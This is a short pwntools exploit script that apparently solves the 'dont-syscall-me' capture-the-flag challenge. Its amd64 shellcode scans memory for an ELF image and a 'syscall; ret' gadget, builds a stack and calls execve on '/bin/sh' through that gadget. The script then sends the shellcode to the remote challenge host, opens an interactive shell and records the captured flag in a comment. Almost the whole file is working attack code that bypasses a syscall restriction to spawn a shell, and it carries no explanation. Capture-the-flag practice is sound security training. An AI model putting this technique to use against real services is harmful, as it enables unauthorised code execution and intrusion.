from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

sc = asm(
    """
lea rax, [rip+0]
shr rax, 12
shl rax, 12
mov r9, rax  # mapped page
loop:
add rax, 0x1000
mov ebx, [rax]
cmp ebx, 0x464c457f  # elf header
jne loop

add rax, 0x2000  # read only page
mov rcx, 0xc30501  # syscall; ret
add rcx, 0x0e
loop2:
inc rax
mov rbx, [rax]
and rbx, 0xffffff
cmp rbx, rcx
jne loop2

mov r8, rax
mov rsp, [fs:0x0] # writable stack


"""
    + shellcraft.pushstr(b"/bin/sh\0")
    + """
mov rax, 0x3b  # execve
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
call r8

inf:
jmp inf
"""
)
print(sc)
# io = gdb.debug('./vuln', 'b *(main+241)\nc')
# io = process('./vuln')
io = remote("dont-syscall-me.chal.imaginaryctf.org", 1337)
io.sendline(sc)
io.interactive()
# ictf{sc4nn1ng_thrU_m3m0ry}
